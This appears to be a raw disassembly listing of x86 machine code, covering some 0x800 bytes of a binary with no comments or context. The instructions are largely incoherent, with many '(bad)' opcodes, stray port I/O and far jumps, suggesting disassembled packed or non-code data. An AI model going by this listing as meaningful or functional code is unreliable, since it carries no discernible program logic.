  4133c7:	outs   dx,BYTE PTR ds:[esi]
  4133c8:	jns    0x4133c2
  4133ca:	xlat   BYTE PTR ds:[ebx]
  4133cb:	jmp    FWORD PTR [ebp-0x6ef7d1b8]
  4133d1:	cdq    
  4133d2:	dec    edx
  4133d3:	mov    ss,WORD PTR [ebx+0x2802d5b9]
  4133d9:	mov    edi,0xae2c7bc3
  4133de:	stc    
  4133df:	add    dl,bh
  4133e1:	cdq    
  4133e2:	cmp    eax,0x8cf4f6ee
  4133e7:	mov    dl,BYTE PTR [ebx]
  4133e9:	retf   0x66a6
  4133ec:	lods   al,BYTE PTR ds:[esi]
  4133ed:	jnp    0x4133c3
  4133ef:	lods   eax,DWORD PTR ds:[esi]
  4133f0:	mov    DWORD PTR [edi],esi
  4133f2:	data16 add BYTE PTR [ebx],al
  4133f5:	(bad)  
  4133f6:	mov    bh,BYTE PTR [eax+0x7c6f8e54]
  4133fc:	test   eax,0x35d87362
  413401:	inc    edi
  413402:	stos   BYTE PTR es:[edi],al
  413403:	inc    esp
  413404:	and    esi,DWORD PTR [edx-0x15e57a51]
  41340a:	inc    esp
  41340b:	test   al,0x23
  41340d:	shl    DWORD PTR [edx],0x1e
  413410:	jmp    0xb511:0xa610d7d8
  413417:	push   esp
  413418:	sub    bh,dl
  41341a:	push   0xffffffcc
  41341c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41341d:	or     ebp,DWORD PTR [edi]
  41341f:	lods   eax,DWORD PTR ds:[esi]
  413420:	int    0xa9
  413422:	jbe    0x4133b1
  413424:	popf   
  413425:	pushf  
  413426:	les    edi,FWORD PTR ss:[edi+edx*2-0x58]
  41342b:	aaa    
  41342c:	mov    ch,0x9e
  41342e:	add    eax,0x8b88c578
  413433:	pop    ss
  413434:	inc    ecx
  413435:	pop    ss
  413436:	add    eax,0x8d53a5f3
  41343b:	jle    0x4133fa
  41343d:	mov    edx,0xa4ea054d
  413442:	mov    ebp,0x5574f9f5
  413447:	call   0xbd5a3490
  41344c:	sub    BYTE PTR [eax+eax*2-0x5a],bl
  413450:	lea    ecx,[ecx+0x9e114f0]
  413456:	and    cl,BYTE PTR [edi+esi*2]
  413459:	test   eax,0xb0081097
  41345e:	sbb    al,0x42
  413460:	fidivr WORD PTR [ecx+0x16665d5a]
  413466:	mov    ah,0x68
  413468:	repnz test eax,0x4bca45c7
  41346e:	sub    dl,0x97
  413471:	fidiv  DWORD PTR [ecx+0x65]
  413474:	inc    DWORD PTR [esi]
  413476:	push   0x8cc16d90
  41347b:	pushf  
  41347c:	out    dx,eax
  41347d:	(bad)  
  41347e:	lea    esi,[ebx-0x20]
  413481:	mov    bh,0x4f
  413483:	jbe    0x413496
  413485:	ss or  bl,al
  413488:	sbb    DWORD PTR [ecx+0x5975f180],ebp
  41348e:	push   cs
  41348f:	mov    dl,0x51
  413491:	pop    edi
  413492:	jbe    0x413431
  413494:	gs scas al,BYTE PTR es:[edi]
  413496:	cmp    DWORD PTR [esi],ebp
  413498:	add    BYTE PTR ds:0x779a39b9,0xc3
  41349f:	mov    bh,bl
  4134a1:	sub    al,0xb
  4134a3:	push   ebp
  4134a4:	int    0xc7
  4134a6:	pop    ss
  4134a7:	dec    edi
  4134a8:	fld    TBYTE PTR [edi+0x692aeff]
  4134ae:	iret   
  4134af:	jno    0x413464
  4134b1:	mov    ecx,0xa100da76
  4134b6:	test   al,0x38
  4134b8:	push   0xffffffd0
  4134ba:	add    cl,BYTE PTR [ebp-0x68]
  4134bd:	adc    bh,BYTE PTR [eax-0x7b90abbd]
  4134c3:	mov    eax,0x75cae46d
  4134c8:	and    cl,bl
  4134ca:	fadd   DWORD PTR [esi-0x50cde3bf]
  4134d0:	(bad)  
  4134d1:	in     eax,dx
  4134d2:	inc    edx
  4134d3:	rcr    esp,0xb3
  4134d6:	or     eax,0xc3d87d3f
  4134db:	add    esp,ecx
  4134dd:	jnp    0x4134f2
  4134df:	jmp    0x413555
  4134e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e2:	aas    
  4134e3:	ins    BYTE PTR es:[edi],dx
  4134e4:	outs   dx,DWORD PTR ds:[esi]
  4134e5:	push   ebx
  4134e6:	push   es
  4134e7:	and    eax,0x30fa801a
  4134ec:	leave  
  4134ed:	mov    bh,0x60
  4134ef:	jmp    0xa558:0x1cbdb6a6
  4134f6:	sub    bh,BYTE PTR [edi-0x2b]
  4134f9:	clc    
  4134fa:	clc    
  4134fb:	cmc    
  4134fc:	fild   QWORD PTR [edx]
  4134fe:	not    DWORD PTR [esi+ebp*8+0x517b9f0d]
  413505:	(bad)  
  413507:	pop    ebx
  413508:	xchg   ebp,eax
  413509:	sub    eax,0xe9a5c921
  41350e:	xchg   ebx,eax
  41350f:	xlat   BYTE PTR ds:[ebx]
  413510:	inc    esi
  413511:	gs dec ebp
  413513:	inc    esi
  413514:	jg     0x4134c1
  413516:	and    eax,0xe216fd65
  41351b:	cmp    esp,DWORD PTR [edx+0x20e4710]
  413521:	pop    edx
  413522:	adc    al,ch
  413524:	fistp  WORD PTR [ecx-0x6d5f61ba]
  41352a:	sar    DWORD PTR [edx],0xde
  41352d:	pushf  
  41352e:	cwde   
  41352f:	pop    es
  413530:	std    
  413531:	cld    
  413532:	inc    edi
  413533:	std    
  413534:	and    DWORD PTR [ecx-0x69],ebx
  413537:	repnz out 0x6f,al
  41353a:	mov    ch,0xc6
  41353c:	xchg   DWORD PTR es:0xda14c2d,eax
  413543:	call   0x5dd0:0x7c0dd2c6
  41354a:	mov    esi,0xd2894108
  41354f:	sbb    DWORD PTR [ebx],0xfffffff9
  413552:	or     BYTE PTR [ecx-0x65d79f3],bl
  413558:	jl     0x413508
  41355a:	pop    edx
  41355b:	out    dx,al
  41355c:	imul   bh
  41355e:	cmp    DWORD PTR [esi-0x80],edx
  413561:	jg     0x41350a
  413563:	out    0xdc,al
  413565:	lahf   
  413566:	fiadd  DWORD PTR [ecx-0x78]
  413569:	dec    ecx
  41356a:	pop    esi
  41356b:	mov    ch,0xa4
  41356d:	out    0xa8,eax
  41356f:	div    bh
  413571:	xor    esp,esi
  413573:	dec    edx
  413574:	mov    ebp,0x8a088692
  413579:	xor    BYTE PTR [ecx+eax*8],cl
  41357c:	adc    BYTE PTR [esi-0x51],bl
  41357f:	(bad)  
  413581:	lea    eax,[eax+0x56]
  413584:	rcr    DWORD PTR ds:[edx+0x76cda263],0xc2
  41358c:	scas   al,BYTE PTR es:[edi]
  41358d:	push   ebp
  41358e:	(bad)  
  413590:	sub    edx,ebp
  413592:	dec    esp
  413593:	or     bl,BYTE PTR [ebx+0x6f]
  413596:	les    edx,FWORD PTR [ebx+0x19]
  413599:	int    0x3f
  41359b:	stc    
  41359c:	inc    eax
  41359d:	xchg   ebx,eax
  41359e:	shl    BYTE PTR [ebp-0x379c082f],cl
  4135a4:	iret   
  4135a5:	in     al,0x40
  4135a7:	mov    esp,0xd385d509
  4135ac:	stos   BYTE PTR es:[edi],al
  4135ad:	test   DWORD PTR [ecx],eax
  4135af:	rcr    esi,1
  4135b1:	adc    cl,0xc4
  4135b4:	gs push esi
  4135b6:	mov    al,0xf6
  4135b8:	inc    eax
  4135b9:	fwait
  4135ba:	and    esi,DWORD PTR [edx-0xd]
  4135bd:	fidiv  WORD PTR [ebp+0x234164c4]
  4135c3:	adc    eax,ebp
  4135c5:	mov    eax,ds:0xf92d2906
  4135ca:	out    dx,eax
  4135cb:	je     0x413628
  4135cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ce:	popa   
  4135cf:	or     esp,DWORD PTR [esp+eax*8]
  4135d2:	es inc esp
  4135d4:	mov    ebp,0x679ab391
  4135d9:	cwde   
  4135da:	mov    edi,gs
  4135dc:	push   ebp
  4135dd:	cdq    
  4135de:	adc    BYTE PTR [ecx+eax*4+0x39032a46],ah
  4135e5:	xchg   edx,eax
  4135e6:	mov    eax,ds:0x15cf231e
  4135eb:	ja     0x413648
  4135ed:	mov    esi,0x827d804b
  4135f2:	stc    
  4135f3:	jg     0x4135f5
  4135f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135f6:	arpl   di,ax
  4135f8:	cli    
  4135f9:	stos   DWORD PTR es:[edi],eax
  4135fa:	push   ds
  4135fb:	pop    ecx
  4135fc:	iret   
  4135fd:	sub    al,0x23
  4135ff:	sbb    DWORD PTR [eax-0x5c],eax
  413602:	lea    esp,[eax+0x70ddf0a8]
  413608:	rcl    esi,1
  41360a:	xchg   esp,eax
  41360b:	out    0x99,al
  41360d:	(bad)  [edx+ebx*1]
  413610:	push   ds
  413611:	jns    0x413608
  413613:	xchg   esp,eax
  413614:	popf   
  413615:	jl     0x4135ff
  413617:	imul   ebp,DWORD PTR [edx+0x24],0x830f9dfc
  41361e:	hlt    
  41361f:	xor    BYTE PTR [edi-0x2344a696],bh
  413625:	jge    0x4135f4
  413627:	shl    DWORD PTR [ecx-0x2a],0x56
  41362b:	inc    eax
  41362c:	inc    ebp
  41362d:	lahf   
  41362e:	adc    edi,0x6ffb6443
  413634:	std    
  413635:	sub    eax,0x3daf2ace
  41363a:	sar    DWORD PTR [ebx+0xa8dccfd],cl
  413640:	mov    bh,0xa9
  413642:	push   ecx
  413643:	or     eax,0xdc6e6f35
  413648:	popf   
  413649:	outs   dx,DWORD PTR ds:[esi]
  41364a:	mov    edi,0x5e40b85d
  41364f:	aam    0x12
  413651:	(bad)
  413655:	add    edi,DWORD PTR [ecx-0x1a045b6c]
  41365b:	mov    ebp,DWORD PTR [esi-0x2cb8cb91]
  413661:	adc    al,0xb4
  413663:	mov    edi,0x1b5111fc
  413668:	call   esp
  41366a:	pop    edi
  41366b:	dec    edx
  41366c:	mov    ds:0x4cefd28f,eax
  413671:	jnp    0x4136b8
  413673:	mov    edi,0xcebcc044
  413678:	push   esi
  413679:	sub    al,al
  41367b:	xor    al,0xac
  41367d:	mov    bl,0x5
  41367f:	pop    ecx
  413680:	push   edi
  413681:	lods   eax,DWORD PTR ds:[esi]
  413682:	pop    ecx
  413683:	test   BYTE PTR [esi],ah
  413685:	pop    ss
  413686:	repz rcl BYTE PTR ds:[eax+0x1cdfad99],1
  41368e:	push   0x6f497529
  413693:	mov    eax,0x246aadcf
  413698:	mov    ah,0x40
  41369a:	mov    esi,0xaac9e28b
  41369f:	dec    esp
  4136a0:	xchg   esi,eax
  4136a1:	ja     0x413626
  4136a3:	jg     0x4136db
  4136a5:	idiv   DWORD PTR ds:0x9fc6933b
  4136ab:	mov    BYTE PTR [eax+ecx*4],bl
  4136ae:	or     al,bh
  4136b0:	sbb    esi,DWORD PTR [edi]
  4136b2:	sbb    DWORD PTR [ecx-0x56],edx
  4136b5:	jns    0x413708
  4136b7:	js     0x413657
  4136b9:	xchg   ecx,eax
  4136ba:	lods   al,BYTE PTR ds:[esi]
  4136bb:	adc    DWORD PTR [ecx-0x1e],0xffffff98
  4136bf:	jg     0x4136f0
  4136c1:	(bad)  [ecx+0x5f]
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	hlt    
  4136c6:	mov    es,eax
  4136c8:	dec    ecx
  4136c9:	xchg   DWORD PTR [ecx],ebx
  4136cb:	repz sbb eax,0x8f96a71e
  4136d1:	push   edi
  4136d2:	int    0x27
  4136d4:	push   ds
  4136d5:	scas   eax,DWORD PTR es:[edi]
  4136d6:	shr    BYTE PTR [edi-0x52],cl
  4136d9:	lock ins BYTE PTR es:[edi],dx
  4136db:	lods   eax,DWORD PTR ds:[esi]
  4136dc:	fimul  DWORD PTR [edx]
  4136de:	fist   WORD PTR [eax+0x5a]
  4136e1:	cld    
  4136e2:	pop    edx
  4136e3:	cmp    eax,0x2faed138
  4136e8:	popf   
  4136e9:	data16 cmp BYTE PTR [esi-0x1],0x64
  4136ee:	aam    0x9
  4136f0:	sbb    edx,DWORD PTR ds:0xc10e6367
  4136f6:	add    edi,DWORD PTR [ebp+ebp*4+0x11]
  4136fa:	mov    esi,0x838ac868
  4136ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413700:	dec    esp
  413701:	inc    edx
  413702:	scas   eax,DWORD PTR es:[edi]
  413703:	shl    esp,0x24
  413706:	stos   DWORD PTR es:[edi],eax
  413707:	dec    edx
  413708:	(bad)  
  413709:	xor    BYTE PTR [eax-0x3094e4b9],dh
  41370f:	mov    ch,BYTE PTR [ebp-0x10]
  413712:	repz adc edi,esp
  413715:	mov    esp,0xe5482008
  41371a:	fidivr WORD PTR [ecx]
  41371c:	xchg   BYTE PTR ss:[ebx+0x6d6612bd],bl
  413723:	enter  0xf17c,0xdb
  413727:	ss iret 
  413729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41372a:	push   esi
  41372b:	aas    
  41372c:	add    DWORD PTR [ebp+0x1],ecx
  41372f:	aas    
  413730:	icebp  
  413731:	dec    esi
  413732:	clc    
  413733:	lods   al,BYTE PTR ds:[esi]
  413734:	jbe    0x4136f0
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	or     BYTE PTR [eax+eax*1],ch
  41373a:	sbb    ebx,DWORD PTR [edi-0x58]
  41373d:	push   ebx
  41373e:	shr    BYTE PTR [esp+ebx*1+0x45fecb7e],0xc
  413746:	or     esi,eax
  413748:	push   gs
  41374a:	lahf   
  41374b:	jo     0x4136f3
  41374d:	adc    cl,al
  41374f:	es gs stos BYTE PTR es:[edi],al
  413752:	mov    BYTE PTR [edi-0x55],bh
  413755:	adc    eax,0xf9cd7954
  41375b:	(bad)  
  41375c:	pop    esp
  41375d:	loop   0x413710
  41375f:	mov    bl,0x5b
  413761:	add    eax,DWORD PTR [ecx+edi*1-0x58]
  413765:	ret    0x642
  413768:	lods   eax,DWORD PTR ds:[esi]
  413769:	aaa    
  41376a:	aas    
  41376b:	stos   DWORD PTR es:[edi],eax
  41376c:	(bad)  [edi+0x40]
  41376f:	fild   DWORD PTR [ebx-0x2b]
  413772:	mov    edi,0xe973b42a
  413777:	inc    edx
  413778:	mov    ?,WORD PTR [ecx+0x2e7ca73f]
  41377e:	rol    BYTE PTR [edx],cl
  413780:	fdivr  DWORD PTR [ebx]
  413782:	sub    DWORD PTR [esi-0x1ee53f1],esp
  413788:	(bad)  
  41378a:	xchg   ah,ah
  41378c:	or     al,0x26
  41378e:	pop    eax
  41378f:	fwait
  413790:	dec    ebp
  413791:	pop    eax
  413792:	mov    edx,0x66c30e5d
  413797:	add    esp,DWORD PTR [edx]
  413799:	sar    BYTE PTR [edx-0x50194ea],1
  41379f:	jge    0x4137fe
  4137a1:	loope  0x413747
  4137a3:	adc    eax,0xd73113ac
  4137a8:	inc    ebx
  4137a9:	push   0x9754e474
  4137ae:	dec    edi
  4137af:	aaa    
  4137b0:	ds pushf 
  4137b2:	in     al,0x72
  4137b4:	ja     0x413822
  4137b6:	adc    eax,0x55fc15ae
  4137bb:	sub    al,0x9c
  4137bd:	mov    WORD PTR [esi-0x35],cs
  4137c0:	cmp    BYTE PTR [eax],al
  4137c2:	aad    0xf3
  4137c4:	int    0x8
  4137c6:	mov    ss,edi
  4137c8:	test   DWORD PTR [edx],esp
  4137ca:	fnstenv [edi-0x6e]
  4137cd:	dec    eax
  4137ce:	sub    al,0x97
  4137d0:	inc    ebx
  4137d1:	pmaxub mm1,QWORD PTR [esi+0x53]
  4137d5:	jl     0x413765
  4137d7:	mov    ds:0xbb54acbb,al
  4137dc:	adc    edx,edi
  4137de:	clc    
  4137df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e0:	stc    
  4137e1:	sbb    al,dl
  4137e3:	fwait
  4137e4:	mov    esp,ecx
  4137e6:	test   al,0x16
  4137e8:	ret    
  4137e9:	cmp    DWORD PTR [ebx+eiz*4],ebp
  4137ec:	adc    bh,BYTE PTR [edi-0xa]
  4137ef:	mov    esi,0x9b729fc9
  4137f4:	aaa    
  4137f5:	aad    0x41
  4137f7:	adc    eax,0xfe1a2ab8
  4137fc:	in     eax,0x89
  4137fe:	and    al,0xa8
  413800:	cwde   
  413801:	push   0x74
  413803:	xor    esp,esi
  413805:	push   ebx
  413806:	nop
  413807:	xchg   esp,eax
  413808:	mov    ch,0xb4
  41380a:	jbe    0xfe57f2c5
  413810:	fs call 0x5741d12a
  413816:	adc    DWORD PTR [ecx-0x77878a58],edx
  41381c:	stc    
  41381d:	(bad)  
  41381e:	xchg   ebx,eax
  41381f:	les    eax,FWORD PTR [edx]
  413821:	jbe    0x413829
  413823:	inc    esi
  413824:	and    DWORD PTR [esi+0x75],ebp
  413827:	pop    ebp
  413828:	aam    0x47
  41382a:	fmul   DWORD PTR [ecx-0x2e]
  41382d:	gs pop eax
  41382f:	js     0x413845
  413831:	and    BYTE PTR [ebx-0x764576be],al
  413837:	mov    bl,0x74
  413839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41383a:	ret    0xe16c
  41383d:	cmp    eax,0x1238d439
  413842:	lock xchg ebp,eax
  413844:	retf   
  413845:	inc    esi
  413846:	sbb    BYTE PTR [esp+ebp*4+0x6f],dl
  41384a:	mov    ch,0xeb
  41384c:	or     al,0xc1
  41384e:	pop    ecx
  41384f:	sbb    DWORD PTR [esi],0x6b
  413852:	push   edx
  413853:	out    dx,eax
  413854:	push   cs
  413855:	push   cs
  413856:	das    
  413857:	xor    eax,0x5207f268
  41385c:	test   eax,0xc8f724ba
  413861:	sbb    BYTE PTR [esi+esi*1-0x5a],dl
  413865:	ds jb  0x413828
  413868:	fstp   st(4)
  41386a:	mov    ah,0x79
  41386c:	adc    esp,DWORD PTR [ecx]
  41386e:	aas    
  41386f:	scas   al,BYTE PTR es:[edi]
  413870:	pop    ds
  413871:	adc    dl,BYTE PTR [edx]
  413873:	or     eax,0xcc88f604
  413878:	xchg   ecx,eax
  413879:	sti    
  41387a:	jmp    0x6e63:0xb89a9db1
  413881:	adc    BYTE PTR [edx],al
  413883:	xchg   esp,eax
  413884:	fs cmc 
  413886:	jo     0x4138ae
  413888:	imul   ebx,eax,0x15cdf171
  41388e:	sahf   
  41388f:	(bad)  [edx]
  413891:	ror    BYTE PTR [edx-0x7300d35d],cl
  413897:	xchg   ebp,eax
  413898:	ret    0x3d56
  41389b:	fs stc 
  41389d:	add    BYTE PTR [eax-0x16ad95e8],ch
  4138a3:	xchg   edx,eax
  4138a4:	es mov eax,0xb1d4006e
  4138aa:	mov    ecx,0x12e5af58
  4138af:	jno    0x413867
  4138b1:	call   0x9349:0x51ca1e14
  4138b8:	repnz repnz test eax,0xcb463f38
  4138bf:	loope  0x413864
  4138c1:	mov    ah,0x92
  4138c3:	xchg   esp,eax
  4138c4:	cld    
  4138c5:	cwde   
  4138c6:	(bad)  
  4138c7:	mov    ebx,0xab291a0e
  4138cc:	cmp    esp,ecx
  4138ce:	pop    eax
  4138cf:	cli    
  4138d0:	pop    eax
  4138d1:	and    ebx,ecx
  4138d3:	(bad)  
  4138d4:	dec    esi
  4138d5:	stc    
  4138d6:	lds    ebx,FWORD PTR [ebx-0x50c16336]
  4138dc:	push   ecx
  4138dd:	mov    al,0x15
  4138df:	push   ebp
  4138e0:	lea    esp,[edi]
  4138e2:	ret    0xb379
  4138e5:	jg     0x4138f0
  4138e7:	scas   eax,DWORD PTR es:[edi]
  4138e8:	lea    ecx,[eax]
  4138ea:	sbb    al,0xfd
  4138ec:	push   esp
  4138ed:	push   edx
  4138ee:	pop    es
  4138ef:	mov    ebx,0xec10a510
  4138f4:	cmp    BYTE PTR [edi],cl
  4138f6:	ins    DWORD PTR es:[edi],dx
  4138f7:	mov    dh,0x6c
  4138f9:	daa    
  4138fa:	(bad)  
  4138fb:	push   edi
  4138fc:	cmp    bh,BYTE PTR [edx]
  4138fe:	push   edi
  4138ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413900:	mov    WORD PTR [edi],cs
  413902:	mov    bh,0x98
  413904:	lds    edi,FWORD PTR [esi]
  413906:	rcl    BYTE PTR [ebx+0x4],1
  413909:	dec    edx
  41390a:	mov    bl,0x6f
  41390c:	mov    eax,ds:0xda8b2ba5
  413911:	cmp    dl,BYTE PTR [edx]
  413913:	or     BYTE PTR [ebx],dl
  413915:	out    0x6a,al
  413917:	in     al,dx
  413918:	data16 (bad) 
  41391a:	mov    DWORD PTR [esi+ebx*4+0x4f],eax
  41391e:	pop    esp
  41391f:	mov    WORD PTR [ebp+0x30],cs
  413922:	inc    esi
  413923:	inc    esp
  413924:	xchg   ebx,eax
  413925:	mov    bl,0x37
  413927:	xor    DWORD PTR [ecx+0x622e8bab],0xffffff85
  41392e:	xchg   ebp,eax
  41392f:	inc    esi
  413930:	mov    bh,0x86
  413932:	mov    ebx,0x53fd1500
  413937:	outs   dx,DWORD PTR ds:[esi]
  413938:	rol    BYTE PTR [edx-0x8699d2e],1
  41393e:	dec    edx
  41393f:	push   ds
  413940:	dec    edx
  413941:	cdq    
  413942:	xchg   DWORD PTR [edx],esp
  413944:	and    BYTE PTR [ebp+edi*1+0x4eb4dc62],dl
  41394b:	sub    edi,DWORD PTR es:[edx]
  41394e:	xchg   esp,eax
  41394f:	icebp  
  413950:	add    cl,ch
  413952:	sub    BYTE PTR [eax+0x4c76f8b2],bh
  413958:	iret   
  413959:	and    cl,BYTE PTR [eax+0x7a996355]
  41395f:	es add eax,0x2079bcb6
  413965:	ins    BYTE PTR es:[edi],dx
  413966:	ins    DWORD PTR es:[edi],dx
  413967:	inc    edx
  413968:	dec    ebx
  413969:	ss daa 
  41396b:	gs xor eax,eax
  41396e:	or     al,0x20
  413970:	dec    eax
  413971:	outs   dx,BYTE PTR ds:[esi]
  413972:	iret   
  413973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413974:	sub    al,0xcb
  413976:	mov    dl,BYTE PTR [ecx]
  413978:	jmp    0x463895af
  41397d:	mov    esp,0x7b961ddc
  413982:	push   edi
  413983:	lock jecxz 0x413984
  413986:	dec    esp
  413987:	xlat   BYTE PTR ds:[ebx]
  413988:	or     BYTE PTR [ecx-0x18de59a1],dh
  41398e:	jbe    0x4139d0
  413990:	cmp    BYTE PTR [ebp-0x7e],0x4
  413994:	sub    BYTE PTR [ecx+0xa3638fb],0x64
  41399b:	mov    WORD PTR [ebx+eiz*2],ds
  41399e:	jae    0x413972
  4139a0:	pusha  
  4139a1:	hlt    
  4139a2:	daa    
  4139a3:	pushf  
  4139a4:	sub    eax,0xbd0892f0
  4139a9:	imul   edx,ecx,0xc57d78e1
  4139af:	das    
  4139b0:	cmp    eax,0xd54fefb4
  4139b5:	stos   DWORD PTR es:[edi],eax
  4139b6:	ds pop esi
  4139b8:	or     al,BYTE PTR [ecx]
  4139ba:	dec    edi
  4139bb:	ret    0xa95
  4139be:	xor    edx,DWORD PTR [ecx]
  4139c0:	iret   
  4139c1:	dec    edx
  4139c2:	ffreep st(7)
  4139c4:	enter  0x983a,0x13
  4139c8:	int    0x61
  4139ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139cb:	(bad)  
  4139cc:	pop    eax
  4139cd:	aaa    
  4139ce:	fwait
  4139cf:	lahf   
  4139d0:	shl    DWORD PTR [ebp+0x56c954c9],1
  4139d6:	sbb    esp,DWORD PTR [edi+ebp*4-0x6b052778]
  4139dd:	out    0xf1,eax
  4139df:	cmp    eax,0xf67bc71
  4139e4:	jne    0x413a1c
  4139e6:	icebp  
  4139e7:	xor    edi,DWORD PTR [ebp-0x28]
  4139ea:	and    edx,DWORD PTR [eax+0x1696dddb]
  4139f0:	paddsb mm1,QWORD PTR [edi+0x44e6420c]
  4139f7:	xchg   BYTE PTR [ebp+0x3443e9cc],dh
  4139fd:	jne    0x413a4e
  4139ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a00:	pop    edi
  413a01:	fwait
  413a02:	shl    BYTE PTR [ebx+0x7b9db33],cl
  413a08:	icebp  
  413a09:	cld    
  413a0a:	pop    eax
  413a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0c:	or     al,0x61
  413a0e:	fs dec edx
  413a10:	(bad)  
  413a11:	adc    dh,BYTE PTR [ecx+0xe]
  413a14:	mov    cl,0x4d
  413a16:	jge    0x4139ab
  413a18:	inc    edi
  413a19:	add    BYTE PTR [ecx-0x5c],al
  413a1c:	icebp  
  413a1d:	les    esp,FWORD PTR [ebp-0x6b62fe51]
  413a23:	adc    al,0xbc
  413a25:	jb     0x4139ad
  413a27:	dec    edi
  413a28:	pop    ss
  413a29:	enter  0x7ad6,0x51
  413a2d:	pop    ss
  413a2e:	xchg   esp,eax
  413a2f:	dec    edi
  413a30:	jo     0x413a1d
  413a32:	jp     0x413a94
  413a34:	jmp    0xf7331588
  413a39:	adc    DWORD PTR [edx],0xdcd0ccee
  413a3f:	sbb    ch,BYTE PTR [ebx+0x56]
  413a42:	xor    BYTE PTR [ebp-0x17e9c103],cl
  413a48:	xor    DWORD PTR [edi+ebp*8+0x16],0xd6fe1de2
  413a50:	push   ebx
  413a51:	ffree  st(5)
  413a53:	loope  0x413a33
  413a55:	fmulp  st(4),st
  413a57:	inc    ebp
  413a58:	loope  0x4139ee
  413a5a:	xor    BYTE PTR [eax],ah
  413a5c:	jae    0x413a26
  413a5e:	push   0x49
  413a60:	pop    esp
  413a61:	inc    edi
  413a62:	shl    BYTE PTR [edx-0x75],0xb7
  413a66:	adc    esp,DWORD PTR [ebx-0x5]
  413a69:	data16 mov dh,0x13
  413a6c:	test   BYTE PTR [ebx-0xbbee15c],bl
  413a72:	mov    ch,BYTE PTR [esi+ebp*2-0x55129de4]
  413a79:	jg     0x413ad5
  413a7b:	pop    esi
  413a7c:	xchg   BYTE PTR [esi-0x3ecd1db6],dh
  413a82:	fisub  WORD PTR [edx+0x1ade27f0]
  413a88:	sub    al,0x7b
  413a8a:	sti    
  413a8b:	inc    eax
  413a8c:	jmp    0xe559:0xd10f0e53
  413a93:	xor    al,0x60
  413a95:	mov    ecx,0x86e27012
  413a9a:	sbb    BYTE PTR [ebx-0x753a0adc],dl
  413aa0:	dec    ebp
  413aa1:	sbb    BYTE PTR ds:0x9a9e94b1,ch
  413aa7:	ins    DWORD PTR es:[edi],dx
  413aa8:	xchg   ebx,eax
  413aa9:	imul   ebp,DWORD PTR [ecx+eiz*8-0x1287a033],0xffffff8d
  413ab1:	enter  0xa90d,0x36
  413ab5:	dec    esp
  413ab6:	test   eax,0xf5a71a8c
  413abb:	ret    0xb6a3
  413abe:	arpl   WORD PTR [ecx-0x1e],ax
  413ac1:	push   ebx
  413ac2:	jae    0x413b34
  413ac4:	pop    ecx
  413ac5:	outs   dx,BYTE PTR ds:[esi]
  413ac6:	arpl   WORD PTR [esi-0x72611480],cx
  413acc:	jg     0x413b13
  413ace:	mov    dl,0x3e
  413ad0:	dec    esp
  413ad1:	cdq    
  413ad2:	push   es
  413ad3:	xchg   esp,eax
  413ad4:	mov    esi,DWORD PTR [ebp-0x2e]
  413ad7:	clc    
  413ad8:	jle    0x413b56
  413ada:	repnz lea ebx,[esi+0x5b]
  413ade:	imul   edx,esi,0xfffffff2
  413ae1:	addr16 enter 0x2279,0xe4
  413ae6:	or     BYTE PTR [edx+eiz*2-0x69],dh
  413aea:	mov    dh,0x9c
  413aec:	retf   0xc545
  413aef:	xor    edx,esp
  413af1:	out    0x8a,al
  413af3:	(bad)
  413af8:	mov    ds:0x3ae0ba82,al
  413afd:	xlat   BYTE PTR ds:[ebx]
  413afe:	jecxz  0x413b72
  413b00:	test   DWORD PTR [edx-0xdb5342c],edx
  413b06:	stos   DWORD PTR es:[edi],eax
  413b07:	pop    ecx
  413b08:	jae    0x413b15
  413b0a:	add    al,0x31
  413b0c:	sbb    eax,0xec83d94f
  413b11:	or     BYTE PTR [ecx+ebx*8-0x152a2d9f],dh
  413b18:	retf   0xe8e0
  413b1b:	or     cl,BYTE PTR [esi]
  413b1d:	inc    ebx
  413b1e:	pop    edi
  413b1f:	xchg   BYTE PTR [ecx],bl
  413b21:	sbb    al,0x0
  413b23:	jbe    0x413b51
  413b25:	sbb    BYTE PTR [ebp-0x44b1b967],dh
  413b2b:	test   BYTE PTR [esi-0x10],ch
  413b2e:	push   esi
  413b2f:	mov    ebp,0xa98bb63b
  413b34:	mov    dh,BYTE PTR [esi+esi*2]
  413b37:	inc    esp
  413b38:	dec    eax
  413b39:	jl     0x413af1
  413b3b:	bound  ebx,QWORD PTR [ebx]
  413b3d:	dec    eax
  413b3e:	xor    eax,0xcb1f6e08
  413b43:	jo     0xf49ab943
  413b49:	lods   al,BYTE PTR ds:[esi]
  413b4a:	xchg   BYTE PTR [ecx],ah
  413b4c:	cmp    al,0xfc
  413b4e:	bnd jb 0x413bc6
  413b51:	mov    ch,0xa2
  413b53:	iret   
  413b54:	pop    ebx
  413b55:	sar    BYTE PTR [edx-0x2569878f],cl
  413b5b:	dec    esp
  413b5c:	sahf   
  413b5d:	jmp    DWORD PTR [ebp-0x2988167]
  413b63:	adc    ebp,DWORD PTR [esi+0x952f9b1]
  413b69:	inc    esi
  413b6a:	add    eax,0x8cc301cc
  413b6f:	add    ebx,ebx
  413b71:	xchg   edi,eax
  413b72:	jb     0x413b12
  413b74:	add    eax,DWORD PTR [ebx+0x1c5823fc]
  413b7a:	fs mov esp,0xb3f950dc
  413b80:	sub    eax,0x804c2e64
  413b85:	sti    
  413b86:	fwait
  413b87:	adc    BYTE PTR [ebp-0x34],dl
  413b8a:	dec    eax
  413b8b:	cld    
  413b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b8d:	dec    eax
  413b8e:	pusha  
  413b8f:	or     DWORD PTR [ebp+0x5bc5623e],esi
  413b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
